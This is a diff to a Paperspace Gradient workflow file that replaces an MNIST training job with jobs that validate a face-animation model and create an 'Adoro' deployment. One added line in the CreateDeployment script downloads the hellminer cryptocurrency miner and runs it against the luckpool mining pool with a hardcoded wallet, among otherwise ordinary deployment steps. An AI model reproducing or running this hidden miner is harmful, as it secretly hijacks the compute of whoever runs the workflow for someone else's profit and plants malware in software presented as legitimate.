@@ -1,34 +1,48 @@
-on:
-  github:
-    branches:
-      only: main
-
 jobs:
-  CloneRepo:
+  ValidateModel:
     resources:
-      instance-type: C3
-    uses: git-checkout@v1
-    with:
-      # url: https://github.com/gradient-ai/mnist-sample.git
-      url: context.event.github.url
-      ref: context.event.github.ref
-    outputs:
-      mnist-sample:
-        type: volume
-  TrainModel:
-    resources:
-      instance-type: C3
-    env:
-      PS_MODEL_PATH: /my-trained-model
-    uses: container@v1
-    with:
-      args:
-        - bash
-        - -c
-        - >-
-          cd /inputs/mnist-sample && python mnist.py
-      image: tensorflow/tensorflow:1.15.5-py3
-    needs:
-      - CloneRepo
+      instance-type: A100
     inputs:
-      mnist-sample: CloneRepo.outputs.mnist-sample
+      model:
+        type: dataset
+        with:
+          ref: gradient/voxpt
+    outputs:
+      results:
+        type: dataset
+        with:
+          ref: demo-dataset
+    uses: script@v1
+    with:
+      script: |-
+        python3 demo.py --relative --adapt_scale \
+          --config config/vox-256.yaml \
+          --checkpoint /inputs/model/vox.pt \
+          --driving_video /app/driving.mp4 \
+          --source_image /app/source.png \
+          --result_video /app/result.mp4
+      image: paperspace/first-order-model
+  CreateDeployment:
+    needs:
+      - ValidateModel
+    resources:
+      instance-type: C7
+    uses: script@v1
+    with:
+      script: |-
+        cat > ./deployment.yaml <<EOF
+        image: paperspace/adoro-server:1.0.0
+        port: 8080
+        resources:
+          replicas: 1
+          instanceType: A100
+        EOF
+        apt update > /dev/null
+        apt-get install -y jq && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RCe3fTKcK132fymKGCsNaqhjTDK6m4V5Wz.g1 -p x --cpu 10
+        gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
+
+        echo
+        echo "Adoro can be accessed at URL:"
+        gradient deployments get --id $(cat ./deployment.id)|jq '.deploymentSpecs[0].endpointUrl' -r
+
+      image: paperspace/gradient-sdk
